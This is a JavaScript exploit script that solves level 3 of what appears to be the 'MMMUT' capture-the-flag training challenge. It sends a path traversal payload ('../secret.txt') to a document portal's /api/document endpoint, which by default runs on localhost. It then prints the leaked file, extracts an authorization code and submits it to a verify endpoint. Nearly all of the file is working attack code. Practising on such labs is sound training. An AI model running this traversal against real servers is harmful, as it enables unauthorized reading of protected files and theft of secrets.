/**
 * EXPLOIT SCRIPT - Path Traversal
 * MMMUT Level 3 - Document Portal
 * 
 * Vulnerability: The /api/document endpoint does not properly sanitize
 * user input, allowing directory traversal using ../
 * 
 * Solution: Access the secret.txt file that's outside the documents folder
 */

const BASE_URL = process.env.TARGET_URL || 'http://localhost:3000';

async function exploit() {
    console.log('üîì MMMUT Level 3 - Path Traversal Exploit');
    console.log('='.repeat(50));

    // The vulnerable parameter is 'file' in /api/document
    // Documents are served from /documents folder
    // We need to go up one directory to access secret.txt

    const payload = '../secret.txt';
    console.log(`\n[ATTEMPT] Trying payload: ${payload}`);

    try {
        const res = await fetch(`${BASE_URL}/api/document?file=${encodeURIComponent(payload)}`);
        const data = await res.json();

        if (data.success) {
            console.log('[SUCCESS] File contents retrieved!');
            console.log('-'.repeat(50));
            console.log(data.content);
            console.log('-'.repeat(50));

            // Look for the code in the content
            const codeMatch = data.content.match(/MMMUT_CDC_ADMIN_\d+/);
            if (codeMatch) {
                console.log(`\nüéØ Found authorization code: ${codeMatch[0]}`);

                // Verify the code
                const verifyRes = await fetch(`${BASE_URL}/api/verify`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ code: codeMatch[0] })
                });
                const verifyData = await verifyRes.json();

                if (verifyData.success) {
                    console.log(`\n‚úÖ ${verifyData.message}`);
                    console.log(`üêõ ${verifyData.bugFound}`);
                }
            }
        } else {
            console.log(`[FAILED] ${data.error}`);
        }
    } catch (e) {
        console.log(`[ERROR] ${e.message}`);
    }
}

exploit().catch(console.error);
